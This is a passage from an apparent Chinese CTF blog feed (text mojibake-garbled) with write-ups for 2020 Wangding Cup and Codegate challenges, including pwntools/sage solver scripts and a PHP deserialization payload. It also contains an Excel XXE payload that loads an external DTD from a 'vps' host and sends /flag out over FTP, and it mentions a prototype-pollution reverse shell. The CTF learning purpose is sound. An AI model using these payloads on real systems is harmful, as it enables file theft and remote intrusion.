class="string">&quot;Crazy:&quot;</span>)</span><br><span class="line">    tmp = r.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    n.append(<span class="built_in">int</span>(tmp))</span><br><span class="line">    n1, n2, n3, n4, n5, n6 = n</span><br><span class="line">    a = n2 - n1</span><br><span class="line">    b = n3 - n2</span><br><span class="line">    c = n4 - n3</span><br><span class="line">    <span class="keyword">if</span> gmpy2.gcd(a, b) != <span class="number">1</span>:</span><br><span class="line">        r.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    x, y = egcd(a, b)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">assert</span> x * a + y * b == <span class="number">1</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        r.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    d = b * x + c * y</span><br><span class="line">    m_bei = <span class="built_in">abs</span>(d * (n5 - n4) - (n6 - n5))</span><br><span class="line">    data = os.popen(<span class="string">&#x27;sage test.sage %s&#x27;</span> % <span class="built_in">str</span>(m_bei)).read()  <span class="comment"># åˆ†è§£</span></span><br><span class="line">    data = data.split(<span class="string">&quot; * &quot;</span>)</span><br><span class="line">    m = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">int</span>(i).bit_length() == <span class="number">64</span>:</span><br><span class="line">                m = <span class="built_in">int</span>(i)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    info(m)</span><br><span class="line">    aa = (gmpy2.invert(a, m) * b) % m</span><br><span class="line">    cc = (n2 - n1 * aa) % m</span><br><span class="line">    res = (aa * n6 + cc) % m</span><br><span class="line">    success(res)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(res))</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    answer = []</span><br><span class="line">    flag = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        r.sendlineafter(<span class="string">&quot;Input your answer:&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Right&quot;</span> <span class="keyword">in</span> r.recvuntil(<span class="string">&quot;!&quot;</span>):</span><br><span class="line">            flag = <span class="literal">True</span></span><br><span class="line">        r.recvuntil(<span class="string">&quot;The answer is&quot;</span>)</span><br><span class="line">        answer.append(<span class="built_in">int</span>(r.recvuntil(<span class="string">&quot;!&quot;</span>).strip(<span class="string">&quot;!&quot;</span>)))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> flag:</span><br><span class="line">        info(<span class="string">&#x27;times:&#x27;</span> + <span class="built_in">str</span>(time))</span><br><span class="line">        time += <span class="number">1</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    info(<span class="string">&#x27;success!&#x27;</span>)</span><br><span class="line">    init = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> answer[:<span class="number">5</span>]:</span><br><span class="line">        init += <span class="built_in">bin</span>(i)[<span class="number">2</span>:].zfill(<span class="number">8</span>)</span><br><span class="line">    init = init[::<span class="number">-1</span>]</span><br><span class="line">    first = init[<span class="number">0</span>]</span><br><span class="line">    init = init[<span class="number">1</span>:]</span><br><span class="line">    rr = <span class="built_in">int</span>(init, <span class="number">2</span>)</span><br><span class="line">    res = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> answer[<span class="number">5</span>:]:</span><br><span class="line">        res += <span class="built_in">bin</span>(i)[<span class="number">2</span>:].zfill(<span class="number">8</span>)</span><br><span class="line">    res = (first + res)[:<span class="number">-2</span>]</span><br><span class="line">    key = get_mask(init + res)</span><br><span class="line">    game = Game(<span class="number">40</span>, key, rr, <span class="number">8</span>)</span><br><span class="line">    <span class="keyword">assert</span> [game.<span class="built_in">next</span>() <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)] == answer</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Input your answer:&quot;</span>, <span class="built_in">str</span>(game.<span class="built_in">next</span>()))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è·‘äº†å¾ˆå¤šæ¬¡ï¼Œç»“æœï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-c2056d3de83b64d7.png" alt="image.png"></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;Web&quot;&gt;&lt;a href=&quot;#Web&quot; class=&quot;headerlink&quot; title=&quot;Web&quot;&gt;&lt;/a&gt;Web&lt;/h2&gt;&lt;h3 id=&quot;nmap&quot;&gt;&lt;a href=&quot;#nmap&quot; class=&quot;headerlink&quot; title=&quot;nmap&quot;&gt;&lt;/a&gt;nmap&lt;/h3&gt;&lt;p&gt;å¯ä»¥æ‰«æipï¼Œå°è¯•å‘½ä»¤æ³¨å…¥æœªæœï¼Œåº”è¯¥æ˜¯è°ƒç”¨äº†nmapè¿›è¡Œæ‰«æã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://igml.top/categories/CTF/"/>
    
    <category term="Web" scheme="https://igml.top/categories/CTF/Web/"/>
    
    <category term="Crypto" scheme="https://igml.top/categories/CTF/Web/Crypto/"/>
    
    
    <category term="CTF" scheme="https://igml.top/tags/CTF/"/>
    
    <category term="Crypto" scheme="https://igml.top/tags/Crypto/"/>
    
    <category term="Web" scheme="https://igml.top/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>2020ç½‘é¼æ¯-é’é¾™ç»„wp</title>
    <link href="https://igml.top/2020/05/13/2020-%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99/"/>
    <id>https://igml.top/2020/05/13/2020-%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99/</id>
    <published>2020-05-13T02:25:37.000Z</published>
    <updated>2020-05-18T02:57:35.719Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="AreUSerialz"><a href="#AreUSerialz" class="headerlink" title="AreUSerialz"></a>AreUSerialz</h3><a id="more"></a><p>é¢˜ç›®æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $op;</span><br><span class="line">    <span class="keyword">protected</span> $filename;</span><br><span class="line">    <span class="keyword">protected</span> $content;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        $filename = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        $content = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            $res = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output($res);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((<span class="keyword">string</span>)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            $res = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>($res) <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $res = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            $res = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params">$s</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> $s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params">$s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($s); $i++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord($s[$i]) &gt;= <span class="number">32</span> &amp;&amp; ord($s[$i]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    $str = (<span class="keyword">string</span>)$_GET[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid($str)) &#123;</span><br><span class="line">        $obj = unserialize($str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬é€‰æ‹©è¯»æ–‡ä»¶ï¼Œop å¤„å¼±ç±»å‹ç»•è¿‡å³å¯ï¼Œç”±äºæ˜¯potected å±æ€§ï¼Œæ­£å¸¸ååºåˆ—åŒ–ä¸­ä¼šæœ‰\0ï¼Œè¿™ä¸ªé¢˜è¿‡æ»¤äº†ä¸å¯è§å­—ç¬¦ï¼Œéœ€è¦æ”¹æˆpublicï¼Œæˆ–è€…ä½¿ç”¨pç¥æåˆ°çš„Så¤§å†™ï¼Œåé¢å¯ä»¥ä½¿ç”¨hexç¼–ç ï¼Œå³\00ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?str&#x3D;O:11:%22FileHandler%22:3:&#123;s:2:%22op%22;i:2;s:8:%22filename%22;s:8:%22flag.php%22;s:1:%22%22&#125;</span><br></pre></td></tr></table></figure><h3 id="filejava"><a href="#filejava" class="headerlink" title="filejava"></a>filejava</h3><p>ä¸Šä¼ æ–‡ä»¶ï¼Œä¸‹è½½æ–‡ä»¶ï¼Œå‘ç°ä¸‹è½½æ–‡ä»¶å¤„å­˜åœ¨ä»»æ„æ–‡ä»¶ä¸‹è½½ï¼Œå¾ˆå¤š<code>../</code>å³å¯ã€‚æç¤ºåœ¨/flagï¼Œä½†æ˜¯è¯»å–ä¸äº†ï¼Œåº”è¯¥æ˜¯è¿‡æ»¤äº†ã€‚</p><p>è¯»å–web.xml</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-63132edbf5b6c9bc.png" alt="image.png"></p><p>å¯ä»¥çœ‹åˆ° file_in_javaï¼Œè¯»å– file_in_java.warï¼Œæ‹‰ä¸‹æºç åˆ†æï¼Œå‘ç°æœ‰excelå¤„ç†ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-3b0a3f48c3e2df7a.png" alt="image.png"></p><p>æƒ³åˆ°excelè§£ææ—¶çš„xxeï¼Œå‚è€ƒ<a href="https://www.jishuwen.com/d/2inW/zh-hkï¼Œåœ¨[Content_Types].xmlé‡Œæ’å…¥ï¼š">https://www.jishuwen.com/d/2inW/zh-hkï¼Œåœ¨[Content_Types].xmlé‡Œæ’å…¥ï¼š</a></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">convert</span> [ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://vps/ext.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;%ccc;%ddd;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><p>ext.dtd</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">bbb</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///flag&quot;</span>&gt;</span><span class="meta">&lt;!ENTITY % <span class="meta-keyword">ccc</span> <span class="meta-string">&quot;&lt;!ENTITY &amp;#37; ddd SYSTEM &#x27;ftp://vps:2121/%bbb;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>2121ç«¯å£èµ·ä¸ªftpï¼Œå¯ä»¥è¯»åˆ°flagï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-70465bec165a381d.png" alt="image.png"></p><h3 id="notes"><a href="#notes" class="headerlink" title="notes"></a>notes</h3><p>æ²¡å•¥åŠŸèƒ½ï¼Œ/statusæ‰§è¡Œå‘½ä»¤æ¯”è¾ƒå¯ç–‘ã€‚æœäº†æœundefsafeæœ‰åŸå‹é“¾æ±¡æŸ“ï¼Œæ€è·¯å°±æ˜¯ç»™ObjectåŠ ä¸ªå±æ€§ï¼Œå€¼æ˜¯æˆ‘ä»¬è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œç„¶å/statuséå†çš„æ—¶å€™å°±å¯ä»¥æ‰§è¡Œå‘½ä»¤äº†ã€‚</p><p>å…ˆä¿®æ”¹noteå¤„æ±¡æŸ“ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-43af71abbe3dd7d3.png" alt="image.png"></p><p>å†è®¿é—®/statusï¼Œå¯ä»¥å¼¹åˆ°shell</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-ce5c531276699271.png" alt="image.png"></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="you-raise-me-up"><a href="#you-raise-me-up" class="headerlink" title="you_raise_me_up"></a>you_raise_me_up</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">n = <span class="number">2</span>**<span class="number">512</span></span><br><span class="line">m = <span class="number">391190709124527428959489662565274039318305952172936859403855079581402770986890308469084735451207885386318986881041563704825943945069343345307381099559075</span></span><br><span class="line">c = <span class="number">6665851394203214245856789450723658632520816791621796775909766895233000234023642878786025644953797995373211308485605397024123180085924117610802485972584499</span></span><br><span class="line"></span><br><span class="line">flag = discrete_log(Mod(c,n),Mod(m,n))</span><br><span class="line">print(long_to_bytes(flag))</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> î‚° sage exp1.sage</span><br><span class="line">b<span class="string">&#x27;flag&#123;5f95ca93-1594-762d-ed0b-a9139692cb4a&#125;&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;Web&quot;&gt;&lt;a href=&quot;#Web&quot; class=&quot;headerlink&quot; title=&quot;Web&quot;&gt;&lt;/a&gt;Web&lt;/h2&gt;&lt;h3 id=&quot;AreUSerialz&quot;&gt;&lt;a href=&quot;#AreUSerialz&quot; class=&quot;headerlink&quot; title=&quot;AreUSerialz&quot;&gt;&lt;/a&gt;AreUSerialz&lt;/h3&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://igml.top/categories/CTF/"/>
    
    <category term="Web" scheme="https://igml.top/categories/CTF/Web/"/>
    
    
    <category term="CTF" scheme="https://igml.top/tags/CTF/"/>
    
    <category term="Web" scheme="https://igml.top/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>2020 Codegate Webé¢˜è§£</title>
    <link href="https://igml.top/2020/02/10/2020-Codegate/"/>
    <id>https://igml.top/2020/02/10/2020-Codegate/</id>
    <published>2020-02-10T08:19:09.000Z</published>
    <updated>2020-02-24T03:18:01.434Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ–‡ç« é¦–å‘äºå®‰å…¨å®¢ https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;198479</span><br></pre></td></tr></table></figure><p>Codegate è¿˜æ˜¯æœ‰å¾ˆå¤šå›½é™…å¼ºé˜Ÿå‚åŠ çš„ï¼Œè¿™é‡Œè®°å½•ä¸¤é“ Codegate Webé¢˜ã€‚</p><a id="more"></a><h2 id="CSP"><a href="#CSP" class="headerlink" title="CSP"></a>CSP</h2><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>é¢˜ç›®ç»™äº† api.php çš„ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&quot;q&quot;</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">&quot;sig&quot;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;?&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$api_string = base64_decode($_GET[<span class="string">&quot;q&quot;</span>]);</span><br><span class="line">$sig = $_GET[<span class="string">&quot;sig&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(md5($salt.$api_string) !== $sig)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;??&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//APIs Format : name(b64),p1(b64),p2(b64)|name(b64),p1(b64),p2(b64) ...</span></span><br><span class="line">$apis = explode(<span class="string">&quot;|&quot;</span>, $api_string);</span><br><span class="line"><span class="keyword">foreach</span>($apis <span class="keyword">as</span> $s) &#123;</span><br><span class="line">    $info = explode(<span class="string">&quot;,&quot;</span>, $s);</span><br><span class="line">    <span class="keyword">if</span>(count($info) != <span class="number">3</span>)</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    $n = base64_decode($info[<span class="number">0</span>]);</span><br><span class="line">    $p1 = base64_decode($info[<span class="number">1</span>]);</span><br><span class="line">    $p2 = base64_decode($info[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($n === <span class="string">&quot;header&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(strlen($p1) &gt; <span class="number">10</span>)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">if</span>(strpos($p1.$p2, <span class="string">&quot;:&quot;</span>) !== <span class="literal">false</span> || strpos($p1.$p2, <span class="string">&quot;-&quot;</span>) !== <span class="literal">false</span>) <span class="comment">//Don&#x27;t trick...</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        header(<span class="string">&quot;<span class="subst">$p1</span>: <span class="subst">$p2</span>&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span> ($n === <span class="string">&quot;cookie&quot;</span>) &#123;</span><br><span class="line">        setcookie($p1, $p2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span> ($n === <span class="string">&quot;body&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/&lt;.*&gt;/&quot;</span>, $p1))</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">echo</span> $p1;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;\n&lt;br /&gt;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span> ($n === <span class="string">&quot;hello&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hello, World!\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>é¢˜ç›®çš„ CSP çš„ç­–ç•¥æ˜¯ <code>default-src &#39;self&#39;; script-src &#39;none&#39;; base-uri &#39;none&#39;;</code>ï¼Œè¿™åŸºæœ¬ç»™å µæ­»äº†ï¼Œç›´æ¥æ‰“ cookie ä¸å¯èƒ½äº†ã€‚</p><p>index.php å¯ä»¥ç»™ä¸€ä¸ªAPIï¼Œå¾—åˆ°ç­¾åï¼Œä½†æ˜¯ä¸æ”¯æŒä¸€æ¬¡å¤šä¸ªAPIï¼Œæˆ‘ä»¬æ²¡æœ‰ keyï¼Œè¿™é‡Œæ˜æ˜¾æ˜¯ä¸€ä¸ªå“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»çš„è€ƒç‚¹ï¼Œé‡‡ç”¨ <code>salt+msg</code>çš„æ–¹å¼è¿›è¡Œå“ˆå¸Œã€‚</p><p>æ¥ç€ api.phpï¼Œå‘ç°å¯ä»¥è®¾ç½® headerï¼Œè®¾ç½® cookieï¼Œè¾“å‡ºå†…å®¹ã€‚è®¾ç½® headeråšäº†ä¸€å®šè¿‡æ»¤ï¼Œæ— æ³•è¦†ç›– CSP è®¾ç½®ã€‚body è¿™éƒ¨åˆ†è¿‡æ»¤æ²¡å•¥ç”¨ï¼Œpreg_match çš„ . ä¸åŒ¹é… \nã€‚</p><p>å…³é”®åœ¨äºä½¿ CSP å¤±æ•ˆï¼Œå¯ä»¥è®¾ç½® HTTP çŠ¶æ€ç ä¸º 102 ä½¿ CSP å¤±æ•ˆï¼ŒåŒæ—¶å¯ä»¥æ‰§è¡Œjsã€‚ä¸ºäº†éªŒè¯æˆ‘æœ¬åœ°å†™äº†ä¸ª phpï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&quot;Content-Security-Policy: default-src &#x27;self&#x27;; script-src &#x27;none&#x27;;&quot;</span>);</span><br><span class="line">header(<span class="string">&quot;HTTP/: 102&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;script&gt;alert(<span class="number">1</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>æˆ‘ç”¨ nimmis/apache-php7 è¿™ä¸ªé•œåƒèµ·äº†ä¸ª dockerï¼Œå‘ç° chrome æ˜¯ä¸å¯ä»¥çš„ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-30150a4a16bf06ad.png" alt="image.png"></p><p>å¼€å§‹ä»¥ä¸º chrome ç‰ˆæœ¬é—®é¢˜ï¼Œè¯•äº†æ—§ç‰ˆæœ¬è¿˜æ˜¯ä¸è¡Œã€‚</p><p>æˆ‘ç”¨ mac è‡ªå¸¦çš„ apache å’Œ php 